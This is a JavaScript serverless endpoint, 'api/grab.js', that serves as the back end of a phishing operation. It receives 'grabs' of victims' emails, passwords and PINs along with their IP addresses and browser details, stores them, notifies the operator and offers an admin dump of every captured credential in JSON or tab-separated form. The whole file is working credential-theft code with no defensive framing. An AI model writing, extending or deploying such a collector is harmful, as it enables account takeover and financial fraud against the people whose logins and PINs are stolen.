/* ============================================================
   api/grab.js
   POST = receive a grab.  GET = dump everything (admin).
   ============================================================ */

import { save, all, notify, firstTime } from './_store.js';

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Headers', 'content-type');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  if (req.method === 'OPTIONS') return res.status(204).end();

  /* ---------------- READ ---------------- */
  if (req.method === 'GET') {
    const need = process.env.ADMIN_KEY;
    if (need && req.query.key !== need) {
      return res.status(401).json({ error: 'bad key' });
    }

    const rows = (await all())
      .map((s) => {
        try { return JSON.parse(s); } catch { return { raw: s }; }
      })
      .reverse();

    if (req.query.format === 'text') {
      const lines = rows.map((r) =>
        [r.received, r.stage, r.email, r.password, r.pin, r.ip].join('\t')
      );
      return res.status(200).send(lines.join('\n'));
    }

    return res.status(200).json({ count: rows.length, grabs: rows });
  }

  if (req.method !== 'POST') return res.status(405).json({ error: 'POST only' });

  /* ---------------- WRITE ---------------- */
  let body = req.body;
  if (typeof body === 'string') {
    try { body = JSON.parse(body); } catch { body = {}; }
  }
  if (!body || typeof body !== 'object') body = {};

  const row = Object.assign({}, body, {
    ip: ((req.headers['x-forwarded-for'] || '').split(',')[0] || '').trim()
      || (req.socket && req.socket.remoteAddress) || null,
    ua: req.headers['user-agent'] || null,
    ref: req.headers['referer'] || null,
    received: new Date().toISOString(),
  });

  if (!row.sid) row.sid = 'anon';
  if (typeof row.msgId !== 'string') row.msgId = null;

  // sendBeacon and fetch both fire -> collapse duplicates
  const fresh = await firstTime(row.sid + ':' + row.stage + ':' + (row.n || 0));

  const where = await save(row);
  const msgId = fresh ? await notify(row) : null;

  console.log('[GRAB]', row.stage, row.email || '-', row.pin ? 'PIN:' + row.pin : '');

  return res.status(200).json({
    ok: true,
    store: where,
    msg_id: msgId || row.msgId || null,
  });
}
